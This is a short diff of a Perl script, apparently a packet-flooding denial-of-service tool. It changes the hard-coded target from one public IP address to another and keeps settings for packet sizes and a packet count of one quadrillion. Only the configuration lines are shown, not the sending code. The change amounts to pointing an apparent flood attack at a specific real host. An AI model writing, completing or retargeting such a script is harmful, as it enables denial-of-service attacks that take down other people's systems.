@@ -3,7 +3,7 @@ use strict;
 use warnings;
 use Socket;
 
-my $target_host = "64.227.153.230";
+my $target_host = "117.203.8.210";
 my $max_size = 100;
 my $min_size = 50;
 my $packet_count = 1000000000000000;
